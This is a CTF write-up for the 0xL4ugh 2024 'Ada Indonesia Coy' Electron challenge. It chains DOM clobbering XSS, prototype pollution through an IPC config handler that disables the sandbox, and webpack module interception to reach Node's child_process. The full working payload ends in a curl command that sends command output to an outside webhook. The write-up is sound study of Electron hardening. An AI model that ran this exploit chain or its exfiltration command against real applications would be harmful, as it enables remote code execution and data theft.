+++
title = '2024 0xL4ugh CTF - Ada Indonesia Coy 🇮🇩'
date = '2024-12-29T00:00:00+07:00'
draft = false
tags = ['ctf-writeup', 'electron', 'web']
+++

## Introduction

This writeup covers the "Ada Indonesia Coy" challenge from the 0xL4ugh CTF 2024. The challenge presents an Electron application with multiple security vulnerabilities that can be chained together to achieve Remote Code Execution (RCE). The exploit path demonstrates several advanced techniques including DOM clobbering, prototype pollution via IPC, and Electron's webpack module interception.

## Challenge Setup and Configuration

The Electron application is configured with the following critical security settings in the `BrowserWindow` initialization:

```js
webPreferences: {
  preload: path.join(__dirname, "./preload.js"),
  nodeIntegration: false,
  contextIsolation: false,
},
```

These settings create a specific security posture:

- **`nodeIntegration: false`** - The renderer process cannot directly access Node.js APIs
- **`contextIsolation: false`** - The preload script, renderer process, and Electron internals share the same JavaScript context

The combination of `nodeIntegration: false` and `contextIsolation: false` creates an interesting attack surface: while direct Node.js access is blocked, the shared JavaScript context allows for sophisticated context manipulation attacks.

## Vulnerability Analysis

### 1. DOM Clobbering XSS in Note Display

The application uses a function to display notes in iframes that contains a critical DOM clobbering vulnerability:

```js
async function createNoteFrame(html, time) {
    const note = document.createElement("iframe")
    note.frameBorder = false
    note.height = "250px"
    note.srcdoc = "<dialog id='dialog'>" + html + "</dialog>"
    note.sandbox = 'allow-same-origin'
    note.onload = (ev) => {
        const dialog = new Proxy(ev.target.contentWindow.dialog, {
            get: (target, prop) => {
                const res = target[prop];
                return typeof res === "function" ? res.bind(target) : res;
            },
        })
        setInterval(dialog.close, time / 2);
        setInterval(dialog.showModal, time);
    }
    return note
}

const mynote = await createNoteFrame("<h1>Hati Hati!</h1><p>Website " + decodeURIComponent(document.location) + " Kemungkinan Berbahaya!</p>", 1000)
```

**Vulnerability Details:**
The `setInterval()` function accepts a string as its first argument, which gets evaluated as JavaScript when passed. By using DOM clobbering to override the `dialog` object, we can inject arbitrary JavaScript that executes when `setInterval()` calls `dialog.close` or `dialog.showModal`.

**DOM Clobbering Payload:**
```html
<a id=dialog name=close href="foo:console.log(1337)">
```

When this payload is processed, `setInterval(dialog.close, time / 2)` becomes equivalent to `setInterval("console.log(1337)", time / 2)`, executing our JavaScript code.

### 2. Prototype Pollution via IPC Communication

The application exposes three IPC handlers through the preload script:

```js
// main.js
ipcMain.handle("set-config", (_, conf, obj) => {
  Object.assign(config[conf], obj)
})

ipcMain.handle("get-config", (_) => {
  return config
})

ipcMain.handle("get-window", (_) => {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    parent: mainWindow,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      nodeIntegration: false,
      contextIsolation: false,
    },
    fullscreen: false,
  })
  win.loadFile("./ada-indonesia-coy/index.html")
})

// preload.js
class api {
    getConfig(){
        return electron.ipcRenderer.invoke("get-config")
    }
    setConfig(conf, obj){
        return electron.ipcRenderer.invoke("set-config", conf, obj)
    }
    window(){
        return electron.ipcRenderer.invoke("get-window")
    }
}

window.api = new api()
```

**Vulnerability Details:**
The `set-config` IPC handler uses `Object.assign(config[conf], obj)` without any validation, allowing prototype pollution by targeting `config.__proto__`. This technique can override default Electron configuration values for newly created `BrowserWindow` instances.

**Exploitation:**
```js
api.setConfig("__proto__", {sandbox: false})
api.window()
```

This pollutes the prototype chain to set `sandbox: false`, causing subsequently created `BrowserWindow` instances to launch with the `--no-sandbox` flag:

```
# Normal process
--enable-sandbox

# Polluted process  
--no-sandbox
--no-zygote
```

### 3. Webpack Module Exposure via Context Manipulation

Since the `BrowserWindow` runs with `contextIsolation: false`, we can manipulate the shared JavaScript context to expose Node.js modules. Electron internally uses webpack for module loading, which performs lazy loading of internal modules like `ipcRenderer`.

**Interception Technique:**
```js
window.copyOfIpcRenderer = null;
Object.defineProperty(Object.prototype, `./lib/renderer/api/ipc-renderer.ts`, {
  set(v) {
    window.copyOfIpcRenderer = v;
    window.module = this.module;
  },
  get() {
    return window.copyOfIpcRenderer;
  }
});
```

**How it Works:**
Electron internally calls `__webpack_require__("./lib/renderer/api/ipc-renderer.ts")` to load the IPC renderer. Our property interceptor captures this moment and copies the `this.module` object (which contains Node.js's `require` function) to our window context:

```js
function __webpack_require__(r) {
	var n = t[r];
	if (void 0 !== n)
		return n.exports;
	var i = t[r] = {
		exports: {}
	};
	return e[r](i, i.exports, __webpack_require__),
	i.exports
}
```

This technique grants us access to Node.js modules, including `child_process` for RCE.

## Attack Chain Assembly

The complete exploit chain follows these steps, each protected by sync guards to prevent multiple execution:

**Step 1: Webpack Interceptor Setup**
```js
if (!window.SyncOnce) {
  window.SyncOnce = true;
  
  window.copyOfIpcRenderer = null;
  Object.defineProperty(Object.prototype, `./lib/renderer/api/ipc-renderer.ts`, {
    set(v) {
      window.copyOfIpcRenderer = v;
      window.module = this.module;
    },
    get() {
      return window.copyOfIpcRenderer;
    }
  });
}
```

**Step 2: Prototype Pollution for Sandbox Bypass**
```js
if (!window.SyncOnce) {
  window.SyncOnce = true;
  
  // Webpack interceptor from Step 1
  
  api.setConfig(`__proto__`, { sandbox: false });
  api.window();
}
```

The new `BrowserWindow` inherits the same `document.location`, causing it to load the same malicious payload with our DOM clobbering attack.

**Step 3: Node.js Module Access and RCE**
```js
if (window.module && !window.syncOnce2) {
  window.syncOnce2 = true;
  window.module.exports._load(`child_process`).execSync(`curl http://webhook -d flag=$(/readflag)`);
}
```

## Final Exploit

**Complete Payload:**
```js
if (!window.syncOnce) {
  window.syncOnce = true;

  // Webpack module interception
  window.copyOfIpcRenderer = null;
  Object.defineProperty(Object.prototype, `./lib/renderer/api/ipc-renderer.ts`, {
    set(v) {
      window.copyOfIpcRenderer = v;
      window.module = this.module;
    },
    get() {
      return window.copyOfIpcRenderer;
    }
  });

  // Prototype pollution for sandbox bypass
  api.setConfig(`__proto__`, { sandbox: false });
  api.window();
}

// RCE execution after Node.js modules are exposed
if (window.module && !window.syncOnce2) {
  window.syncOnce2 = true;
  window.module.exports._load(`child_process`).execSync(`curl http://webhook -d flag=$(/readflag)`);
}
```

**Payload Delivery via DOM Clobbering:**
```html
<a id=dialog name=close href="foo:PAYLOAD">
```

**URL-Based Injection:**
The payload can be delivered through URL manipulation using a meta refresh redirect:

```html
<meta http-equiv="refresh" content="0; url=https://127.0.0.1:3000/#URL_ENCODED_DOM_CLOBBERING_PAYLOAD">
```

